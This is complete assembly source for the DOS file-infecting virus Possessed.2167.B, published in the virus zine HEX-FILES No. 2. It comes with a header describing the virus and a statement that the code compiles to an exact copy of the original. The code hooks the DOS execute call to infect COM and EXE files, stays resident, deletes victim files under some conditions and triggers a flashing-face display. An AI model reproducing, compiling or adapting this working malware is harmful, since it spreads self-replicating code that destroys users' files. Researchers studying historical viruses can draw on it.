   ;
   ;   HEX-FILES No. 2                                                   File 004
   ;  ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;
   ;  Virus:         Possessed.2167.B
   ;  Alias:         Possessed 1.02A, Possessed I
   ;  Targets:       COM, EXE
   ;
   ;  Resident:      Low Memory TSR
   ;  MemorySize:    2672 bytes
   ;  MemorySelfRec: [0:1EC] <> 0
   ;  IntHooked:     21/4B00, 8
   ;
   ;  VirusLength:   2167 bytes
   ;  InfectiveLength:
   ;                 COM: 2167 + 26 byte host restorer
   ;                 EXE: 2167 + 15 byte paragraph alignment
   ;  LocationVirusOnFile:
   ;                 COM: Beginning of file; host restorer appended at end of file
   ;                 EXE: End of file
   ;  FileSelfRec:
   ;                 COM: File[0..65] = Virus[0..65]
   ;                 EXE: File[18..19] = 70h 19h
   ;  ReadableText:
   ;                 "POSSESSED! Bwa! ha! ha! ha! ha!$
   ;                  Author: JonJon Gumba of AdU"
   ;  EncryptedText:
   ;                 "JonJon Gumba", "COMMAND.COM", "Fuck Off"
   ;  DisplayedText:
   ;                 1) If ReadableTextNameAuthor <> EncryptedTextNameAuthor
   ;
   ;                           "Fuck Off"
   ;
   ;                 2) If host program EXEC failed
   ;
   ;                           "POSSESSED! Bwa! ha! ha! ha! ha!"
   ;
   ;  Payload:        Flashing face
   ;  PayloadTrigger: 2 hours after going resident
   ;
   ;
   ;
   ;  ÄÄ POS2167B.ASM STARTS HERE ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

    ;-------------------------------------------------------------------
    ; *WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*
    ; *WARNING                                                 WARNING*
    ; *WARNING      destructive codes  intentional damage      WARNING*
    ; *WARNING                 deletes files                   WARNING*
    ; *WARNING                                                 WARNING*
    ; *WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*
    ;-------------------------------------------------------------------
    ; Virus:  Possessed.2167.B
    ; Alias:  Possessed 1.02A, Possessed I
    ; Author: JonJon Gumba
    ; Origin: Adamson University, Manila, Philippines
    ;-------------------------------------------------------------------
    ;
    ; This source code is written in a way so that when compiled you will
    ; get an exact copy of the virus.
    ;
    ; You will only be able to duplicate the original virus if you use
    ; *TASM 2.01* or *MASM 5.0* to compile this program listing. Other
    ; compilers or versions of a compiler might produce a virus different
    ; from that originally released.
    ;
    ; This can also be compiled in a86 4.02 but you will be creating a
    ; new variant.
    ;
    ; Compile to COM.
    ;
    ;-------------------------------------------------------------------
    ; Program listing created by Putoksa Kawayan.        HEX-FILES No. 2
    ;-------------------------------------------------------------------
    ;
    ExeHeader struc
     isExeId       dw   ?
     isMod         dw   ?
     isBlocks      dw   ?
     isRelocItemCt dw   ?
     isHeaderSize  dw   ?
     isMinAlloc    dw   ?
     isMaxAlloc    dw   ?
     isSs          dw   ?
     isSp          dw   ?
     isCxSum       dw   ?
     isIp          dw   ?
     isCs          dw   ?
    ExeHeader ends

    Possessed segment para 'code'
    assume cs:Possessed

    org 0

    MemoryMarkerLoc         equ     01ech
    SaveSsOnInt21           equ     01f6h
    SaveSpOnInt21           equ     01f4h

    PossessedEntry:
          jmp     ComEntry

    PossessedId             db      13,'POSSESSED! Bwa! ha! ha! ha! ha!$',8,32,10
                            db      13,'Author: '
    Author                  db      'JonJon Gumba of AdU',10,26

    isDos:
          jmp     DosHandler

    DosVersion              db      ?
    FirstGenerationFlag     db      1

    DosInterrupt label dword
      DosIntOffset          dw      ?
      DosIntSegment         dw      ?

    ClockInterrupt label dword
      ClockIntOffset        dw      ?
      ClockIntSegment       dw      ?

    ErrorIntOffset          dw      ?
    ErrorIntSegment         dw      ?
    VictimAsciizSegment     dw      ?
    VictimAsciizOffset      dw      ?
    Attribute               dw      ?
    Handle                  dw      ?
    FileTime                dw      ?
    FileDate                dw      ?
    ComLength               dw      ExecuteVictimComFromEof-VictimCode
    AllocatedMemory         dw      ?
    Timer                   dw      ?
    Hour                    db      ?
    ViruSs                  dw      ?
    ViruSp                  dw      ?
    ExeSs                   dw      ?
    ExeSp                   dw      ?
    ExeCs                   dw      ?
    ExeIp                   dw      ?

    ExecuteExeVictim label dword
      ExeVictimOffset       dw      ?
      ExeVictimSegment      dw      ?

    VirusJumper label dword
      VirusJumperOffset     dw      ?
      VirusJumperSegment    dw      ?

    ExeLengthLo             dw      ?
    ExeLengthHi             dw      ?
    Environment             dw      ?
    Psp                     dw      ?

    DosHandler:
          pushf
          cmp     ax,4b00h
          jne     PassToDos
          push    ds
          push    es
          push    si
          push    di
          push    ax
          push    bx
          push    cx
          push    dx
          jmp     SetToInfect
    RestoreRegisters:
          pop     dx
          pop     cx
          pop     bx
          pop     ax
          pop     di
          pop     si
          pop     es
          pop     ds
    PassToDos:
          popf
          jmp     DosInterrupt

    SetToInfect:
          mov     VictimAsciizSegment,ds
          mov     VictimAsciizOffset,dx
          mov     si,dx
          add     si,2
          mov     bx,si
    CheckIfPathSeparator:
          cmp     byte ptr [si],'\'
          jne     CheckIfEndOfFileName
          mov     bx,si
          add     bx,1
          jmp     CheckNextCharOfFileName
    CheckIfEndOfFileName:
          cmp     byte ptr [si],0
          je      EndOfFileName
    CheckNextCharOfFileName:
          inc     si
          jmp     CheckIfPathSeparator

    RestoreErrorInterrupt:
          mov     ax,2524h
          mov     dx,ErrorIntOffset
          mov     ds,ErrorIntSegment
          call    UseDos
          jmp     RestoreRegisters

    EndOfFileName:
          mov     si,bx
          push    cs
          pop     es
          mov     di,offset NameOfVictim
          mov     cx,13
          cld
          repe movsb

    assume cs:Possessed, ds:Possessed

          push    ds
          push    dx
          push    es
          pop     ds
          mov     ax,3524h
          call    UseDos
          mov     ErrorIntSegment,es
          mov     ErrorIntOffset,bx
          mov     ax,2524h
          mov     dx,offset isError
          call    UseDos
          pop     dx
          pop     ds

    assume cs:Possessed, ds:nothing

          mov     ax,4300h
          call    UseDos
    Relay1:
          jc      RestoreErrorInterrupt
          mov     Attribute,cx
          mov     ax,4301h
          mov     cx,20h
          call    UseDos
          jc      Relay1
          mov     ax,3d02h
          call    UseDos
          jc      Relay1
          mov     Handle,ax
          mov     bx,ax
          mov     ax,5700h
          call    UseDos
          mov     FileDate,dx
          mov     FileTime,cx
          mov     bx,-2
          mov     ah,48h
          call    UseDos
          jnc     EnoughMemory
          mov     ah,48h
          call    UseDos
          jc      Relay2
    EnoughMemory:
          mov     AllocatedMemory,ax
          xor     cx,cx
          mov     dx,cx
          mov     bx,Handle
          mov     ax,4202h
          call    UseDos
    Relay2:
          jc      Relay3
          mov     ComLength,ax
          call    MovePointerBegin
    Relay3:
          jc      Relay4
          mov     cx,ComLength
          mov     dx,0
          mov     ds,AllocatedMemory
          mov     ah,3fh
          call    UseDos
    Relay4:
          jc      DoneWithFile
          mov     si,0
          cmp     word ptr [si],'ZM'
          jne     ComInfectCheck
          jmp     NotInfected
    ComInfectCheck:
          mov     di,offset PossessedEntry
          push    cs
          pop     es
          cld
          mov     cx,(isDos-PossessedId)
          repe cmpsb
          je      VerifyInfection
          jmp     NotInfected
    VerifyInfection:
          mov     ax,cs
          mov     ds,ax
          mov     es,ax
          mov     si,offset EncryptedAuthor
          mov     cx,12
          mov     al,25h
          call    Scrambler
          mov     di,offset Author
          call    Compare
          jnc     HideText
          mov     si,offset FuckOff
          mov     cx,12
          mov     al,2bh
          call    Scrambler
          mov     dx,si
          mov     ah,9
          call    UseDos
          mov     al,0d5h
          call    Scrambler
          jmp     DeleteFile
    HideText:
          neg     al
          call    Scrambler

    DoneWithFile:
          mov     es,AllocatedMemory
          mov     ah,49h
          call    UseDos
          mov     bx,Handle
          mov     dx,FileDate
          mov     cx,FileTime
          mov     ax,5701h
          call    UseDos
          mov     ah,3eh
          call    UseDos
          mov     ds,VictimAsciizSegment
          mov     dx,VictimAsciizOffset
          mov     cx,Attribute
          mov     ax,4301h
          call    UseDos
          jmp     RestoreRegisters

    NotInfected:
          push    es
          mov     ds,VictimAsciizSegment
          mov     si,VictimAsciizOffset
          mov     dl,[si]
          sub     dl,'A'-1
          pop     ds
          cmp     DosVersion,3
          jnb     NewDosVersion
          mov     si,offset EncryptedCommandCom
          mov     cx,11
          mov     al,17h
          call    Scrambler
          mov     di,offset NameOfVictim
          call    Compare
          pushf
          neg     al
          call    Scrambler
          popf
          jc      NewDosVersion
    Relay5:
          jmp     DoneWithFile
    NewDosVersion:
          mov     ah,36h
          call    UseDos
          xor     dx,dx
          mul     bx
          mul     cx
          cmp     dx,0
          jne     EnoughDiskSpace
          cmp     ax,2300
          jb      DeleteFile
    EnoughDiskSpace:
          mov     bx,Handle
          call    MovePointerBegin
    Relay6:
          jc      Relay5
          mov     ds,AllocatedMemory
          mov     si,0
          cmp     word ptr [si],'ZM'
          jne     isComFile
          jmp     isExeFile

    assume cs:Possessed, ds:Possessed

    isComFile:
          push    cs
          pop     ds
          mov     cx,offset VictimCode
          mov     dx,offset PossessedEntry
          mov     ah,40h
          call    UseDos
          jc      Relay6
          mov     cx,ComLength
          mov     ds,AllocatedMemory

    assume cs:Possessed, ds:nothing

          mov     dx,0
          mov     ah,40h
          call    UseDos
          jc      Relay7
          mov     cx,offset MoveVirusCode
          mov     dx,offset ExecuteVictimCom
          sub     cx,dx
          mov     ax,cs
          mov     ds,ax
          mov     ah,40h
          call    UseDos
          jc      DeleteFile
    Relay7:
          jmp     VerifyInfection

    DeleteFile:
          mov     ds,VictimAsciizSegment
          mov     dx,VictimAsciizOffset
          mov     ah,41h
          call    UseDos
          jmp     DoneWithFile

    PixelRow       equ     Environment + 100h
    PixelColumn    equ     Psp + 100h

    isClock:
          pushf
          inc     Timer
          jne     NotYetTime
          dec     Hour
          je      ShowTime
    NotYetTime:
          popf
          jmp     ClockInterrupt

    assume cs:Possessed, ds:Possessed

    ShowTime:
          popf
          mov     ax,6
          int     10h
          push    cs
          pop     ds
          xor     bx,bx
          xor     dx,dx
    LoadFaceData:
          mov     si,offset FaceData
          mov     word ptr PixelRow,200
          mov     word ptr PixelColumn,0
          call    ShowPayload
          mov     word ptr PixelRow,201
          mov     word ptr PixelColumn,1
          call    ShowPayload
          mov     word ptr PixelRow,189
          mov     word ptr PixelColumn,-1
          call    ShowPayload
          mov     word ptr PixelRow,201
          mov     word ptr PixelColumn,-1
          call    ShowPayload
          mov     word ptr PixelRow,189
          mov     word ptr PixelColumn,1
          call    ShowPayload
          jmp     LoadFaceData
    ShowPayload:
          push    si
          mov     al,1
          mov     cx,2
    EraseFace:
          push    cx
          push    si
    GetNextCoordinate:
          mov     bl,[si]
          cmp     bl,0
          je      EndFaceData
          mov     cx,bx
          add     cx,PixelRow
          mov     dl,[si+1]
          add     dx,PixelColumn
          mov     ah,0ch
          int     10h
          add     si,2
          jmp     GetNextCoordinate
    EndFaceData:
          pop     si
          mov     al,0
          pop     cx
          loop    EraseFace
          pop     si
          ret

    assume cs:Possessed, ds:nothing

    isExeFile:
          cmp     word ptr [si].isCxSum,1970h
          jne     ExeNotInfected
          jmp     VerifyInfection
    ExeNotInfected:
          mov     word ptr [si].isCxSum,1970h
          mov     ax,[si].isSs
          add     ax,16
          mov     ExeSs,ax
          mov     ax,[si].isSp
          mov     ExeSp,ax
          mov     ax,[si].isIp
          mov     ExeIp,ax
          mov     ax,[si].isCs
          add     ax,16
          mov     ExeCs,ax
          mov     ax,[si].isBlocks
          cmp     word ptr [si].isMod,0
          je      PageAligned
          dec     ax
    PageAligned:
          mov     bx,200h
          mul     bx
          add     ax,[si].isMod
          adc     dx,0
          add     ax,15
          adc     dx,0
          and     ax,0fff0h
          mov     ExeLengthLo,ax
          mov     ExeLengthHi,dx
          add     ax,offset VictimCode
          adc     dx,0
          jc      Relay8
          div     bx
          or      dx,dx
          jz      AlignedToPage
          inc     ax
    AlignedToPage:
          mov     [si].isBlocks,ax
          mov     [si].isMod,dx
          mov     ax,ExeLengthLo
          mov     dx,ExeLengthHi
          mov     bx,16
          div     bx
          sub     ax,[si].isHeaderSize
          sub     ax,16
          mov     [si].isCs,ax
          mov     word ptr [si].isIp,offset ExeEntry + 100h
          mov     [si].isSs,ax
          mov     word ptr [si].isSp,offset VictimCode + 100h
          mov     bx,Handle
          call    MovePointerBegin
          mov     cx,28
          mov     dx,0
          mov     ah,40h
          call    UseDos

    assume cs:Possessed, ds:Possessed

          push    cs
          pop     ds
          mov     dx,ExeLengthLo
          mov     cx,ExeLengthHi
          mov     ax,4200h
          call    UseDos
          mov     dx,Offset PossessedEntry
          mov     cx,offset VictimCode
          mov     ah,40h
          call    UseDos
    Relay8:
          jmp     DoneWithFile

    assume cs:Possessed, ds:nothing

    isError:
          xor     ax,ax
          mov     es,ax
          mov     ss,es:SaveSsOnInt21
          mov     sp,es:SaveSpOnInt21
          pop     ax
          pop     es
          pop     bp
          stc
          ret

    UseDos:
          push    bp
          push    es
          push    ax
          xor     ax,ax
          mov     es,ax
          mov     es:SaveSpOnInt21,sp
          mov     es:SaveSsOnInt21,ss
          pop     ax
          pop     es
          pushf
          call    DosInterrupt
          pop     bp
          ret

    MovePointerBegin:
          xor     cx,cx
          mov     dx,cx
          mov     ax,4200h
          call    UseDos
          ret

    MoveCursor:
          mov     ah,2
          xor     bx,bx
          int     10h
          ret

    Scrambler:
          push    cx
          push    si
    MaskIt:
          sub     [si],al
          inc     si
          loop    MaskIt
          pop     si
          pop     cx
          ret

    Compare:
          push    si
          push    cx
          cld
          repe cmpsb
          je      MatchFound
          stc
    MatchFound:
          pop     cx
          pop     si
          ret

    EncryptedCommandCom     db      'C'+17h,'O'+17h,'M'+17h,'M'+17h
                            db      'A'+17h,'N'+17h,'D'+17h,'.'+17h
                            db      'C'+17h,'O'+17h,'M'+17h

    FuckOff                 db      'F'+2bh,'u'+2bh,'c'+2bh,'k'+2bh
                            db      ' '+2bh,'o'+2bh,'f'+2bh,'f'+2bh
                            db      '!'+2bh,10+2bh,13+2bh,'$'+2bh

    EncryptedAuthor         db      'J'+25h,'o'+25h,'n'+25h,'J'+25h
                            db      'o'+25h,'n'+25h,' '+25h,'G'+25h
                            db      'u'+25h,'m'+25h,'b'+25h,'a'+25h

    ;--------------------------------------------------------
    ;------ Possessed payload data --------------------------
    ;--------------------------------------------------------
    FaceData label byte
     db   41h,4bh,42h,4bh,42h,4ch,43h,4ch,44h,4ch,45h,4ch,43h,4dh,46h
     db   4dh,47h,4dh,44h,4eh,48h,4eh,49h,4eh,4ah,4eh,45h,4fh,4bh,4fh
     db   4ch,4fh,0b6h,4ah,0b5h,4ah,0b5h,4bh,0b4h,4bh,0b3h,4bh,0b2h,4bh,0b4h
     db   4ch,0b1h,4ch,0b0h,4ch,0b3h,4dh,0afh,4dh,0aeh,4dh,0adh,4dh,0b2h,4eh
     db   0ach,4eh,0abh,4eh,4ch,54h,4ch,55h,4dh,55h,4eh,55h,4fh,56h,50h
     db   56h,51h,56h,52h,56h,53h,56h,54h,57h,55h,57h,56h,57h,57h,57h
     db   58h,57h,59h,58h,5ah,58h,5bh,58h,5ch,58h,5dh,58h,5ah,59h,5bh
     db   59h,5ch,59h,5dh,59h,60h,59h,5fh,59h,60h,59h,61h,59h,62h,59h
     db   5bh,5ah,5ch,5ah,63h,5ah,64h,5ah,65h,5ah,66h,5ah,67h,5ah,5ch
     db   5bh,68h,5bh,69h,5bh,6ah,5bh,6bh,5bh,6ch,5bh,6dh,5ch,6eh,5ch
     db   6fh,5ch,70h,5dh,0b1h,53h,0b0h,54h,0afh,54h,0aeh,54h,0adh,55h,0ach
     db   55h,0abh,55h,0aah,55h,0a9h,55h,0a8h,55h,0a7h,56h,0a6h,56h,0a5h,56h
     db   0a4h,56h,0a3h,56h,0a2h,57h,0a1h,57h,0a0h,57h,9fh,57h,9eh,57h,9dh
     db   57h,9ch,58h,9bh,58h,9ah,58h,99h,58h,98h,58h,9ah,59h,99h,59h
     db   98h,59h,97h,59h,96h,59h,95h,59h,94h,59h,93h,59h,92h,59h,99h
     db   5ah,98h,5ah,91h,5ah,90h,5ah,8fh,5ah,8eh,5ah,8dh,5ah,98h,5bh
     db   8ch,5bh,8bh,5bh,8ah,5bh,89h,5bh,88h,5bh,87h,5bh,86h,5ch,85h
     db   5ch,84h,5ch,83h,5ch,76h,63h,75h,64h,75h,65h,74h,66h,74h,67h
     db   73h,68h,73h,69h,72h,6ah,71h,6bh,71h,6ch,70h,6dh,70h,6eh,6fh
     db   6fh,6eh,70h,6eh,71h,7bh,71h,6dh,72h,7ah,72h,79h,72h,6dh,73h
     db   78h,73h,77h,73h,76h,73h,75h,73h,6ch,74h,71h,74h,72h,74h,73h
     db   74h,74h,74h,6ch,75h,6dh,75h,6eh,75h,6fh,75h,70h,75h,6bh,76h
     db   6ch,76h,6dh,81h,6eh,81h,6fh,81h,70h,80h,71h,80h,72h,80h,73h
     db   80h,74h,7fh,75h,7fh,76h,7fh,77h,7fh,78h,7eh,79h,7eh,7ah,7eh
     db   7bh,7eh,7ch,7dh,7dh,7dh,7eh,7dh,7fh,7dh,80h,7dh,81h,7ch,82h
     db   7ch,83h,7ch,84h,7ch,85h,7bh,86h,7bh,87h,7bh,88h,7bh,89h,7ah
     db   8ah,7ah,8bh,7ah,8ch,7ah,8dh,79h,8eh,79h,8fh,79h,90h,79h,91h
     db   78h,92h,78h,93h,78h,94h,77h,95h,77h,96h,76h,97h,76h,98h,75h,0

    ComEntry:
          push    es
          mov     ax,0
          mov     es,ax
          cmp     byte ptr es:MemoryMarkerLoc,0
          je      NotInMemory
          jmp     MemoryResident

    ExeEntry:
          push    es
          xor     ax,ax
          mov     es,ax
          cmp     byte ptr es:MemoryMarkerLoc,0
          jne     ExecuteVictimExe
          jmp     MoveVirusCode

    ExecuteVictimExe:
          pop     es
          mov     ax,es
          add     ax,ExeSs + 100h
          mov     ss,ax
          mov     sp,ExeSp + 100h
          mov     ax,es
          add     ax,ExeCs + 100h
          mov     ExeVictimSegment + 100h,ax
          mov     ax,ExeIp + 100h
          mov     ExeVictimOffset + 100h,ax
          clc
          jmp     ExecuteExeVictim + 100h

    SecondMove:
          cld
          repe movsb
          xor     ax,ax
          mov     es,ax
          mov     byte ptr es:MemoryMarkerLoc,1
          jmp     SetUpPossessed

    NotInMemory:
          mov     byte ptr es:MemoryMarkerLoc,1
          pop     ax
          add     ax,16
          push    ax
          mov     ax,offset SetUpPossessed
          push    ax
          retf

    assume cs:Possessed, ds:Possessed

    SetUpPossessed:
          mov     ax,sp
          sub     ax,100h
          mov     sp,ax
          mov     ax,cs
          mov     ds,ax
          mov     ss,ax
          push    ds
          sub     ax,16
          mov     es,ax
          mov     Psp,es
          mov     ax,es:[2ch]
          mov     Environment,ax
          mov     ax,word ptr ComEntry
          sub     ax,-(3521h-0b806h)
          int     21h
          mov     DosIntOffset,bx
          mov     DosIntSegment,es
          mov     dx,offset isDos
          sub     ah,16
          call    UseDos
          mov     Timer,0
          mov     Hour,2
          add     ax,(3508h-2521h)
          call    UseDos
          mov     ClockIntOffset,bx
          mov     ClockIntSegment,es
          mov     dx,offset isClock
          sub     ah,16
          call    UseDos
          mov     ax,Psp
          mov     si,offset ExecParam
          mov     [si+4],ax
          mov     word ptr [si+2],80h
          mov     [si+8],ax
          mov     word ptr [si+6],5ch
          mov     [si+12],ax
          mov     word ptr [si+10],6ch
          mov     ax,Environment
          mov     [si],ax
          pop     es
          mov     ah,30h
          int     21h
          mov     DosVersion,al
          cmp     al,3
          jb      OldDosVersion
          mov     ds,Environment
          mov     si,0
          mov     cx,200
    LookForStartOfAsciiz:
          cmp     byte ptr [si],1
          jne     SearchEnvironment
          cmp     byte ptr [si+3],':'
          jne     SearchEnvironment
          mov     dx,si
          add     dx,2
          jmp     GotExecPath

    assume cs:Possessed, ds:nothing

    SearchEnvironment:
          inc     si
          loop    LookForStartOfAsciiz
    OldDosVersion:
          push    cs
          pop     ds
          mov     si,offset NameOfVictim
          mov     di,offset VirusAsciiz
          mov     cx,13
          cld
          repe movsb
          mov     dx,offset VirusAsciiz
    GotExecPath:
          push    es
          mov     es,Psp
          mov     bx,1000h
          mov     ah,4ah
          int     21h
          pop     es
          cli
          mov     ViruSs,ss
          mov     ViruSp,sp
          sti
          mov     ax,4b00h
          mov     bx,offset ExecParam
          cmp     DosVersion,3
          jb      DoIntCall
          call    UseDos
          jmp     RestoreStack
    DoIntCall:
          int     21h
    RestoreStack:
          cli
          mov     ss,ViruSs
          mov     sp,ViruSp
          sti
          push    cs
          pop     ds
          jnc     GetReturnCode
          mov     dx,offset PossessedId
          mov     ah,9
          int     21h
    GetReturnCode:
          mov     ah,4dh
          int     21h
          push    ax
          mov     es,ds:Environment
          mov     ah,49h
          call    UseDos
          mov     FirstGenerationFlag,0
          mov     dx,offset VictimCode
          mov     cl,4
          shr     dx,cl
          add     dx,20h
          pop     ax
          mov     ah,31h
          int     21h

    MemoryResident:
          pop     es
          push    cs
          pop     ds
          cmp     FirstGenerationFlag + 100h,0
          je      NotFirstGeneration
          mov     ax,4c00h
          int     21h

    NameOfVictim            db      13 dup (?)

    assume cs:Possessed, ds:Possessed

    NotFirstGeneration:
          mov     bx,offset VictimCode + 100h
          add     bx,ComLength + 100h
          jmp     bx

    ExecuteVictimCom:
          push    ds
          pop     es
          mov     si,offset VictimCode + 100h
          mov     di,100h
          mov     cx,ComLength + 100h
          shr     cx,1
          add     cx,1
          cld
          repe movsw
          mov     bx,100h
          clc
          jmp     bx

    MoveVirusCode:
          pop     ax
          push    cs
          pop     ds
          mov     si,100h
          xor     di,di
          add     ax,16
          mov     es,ax
          mov     cx,offset MoveVirusCode
          shr     cx,1
          cld
          repe movsw
          mov     cx,offset VictimCode + 100h
          sub     cx,offset MoveVirusCode + 100h
          mov     VirusJumperSegment + 100h,es
          mov     VirusJumperOffset + 100h,offset SecondMove

    assume cs:Possessed, ds:nothing

          jmp     VirusJumper + 100h

    VirusStack              dw      35 dup (?)
    ;----------------------------------------------- com host code starts here
    VictimCode:
          jmp     short Terminated

    VirusAsciiz             db      13 dup (?)
    ExecParam               dw      7 dup (?)
    Terminated:
          mov     ah,4ch
          int     21h

    ExecuteVictimComFromEof:
          push    ds
          pop     es
          mov     si,offset VictimCode + 100h
          mov     di,100h
          mov     cx,ComLength + 100h
          shr     cx,1
          add     cx,1
          cld
          repe movsw
          mov     bx,100h
          clc
          jmp     bx

    Possessed ends

    end PossessedEntry


   ; ÄÄ POS2167B.ASM ENDS HERE ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
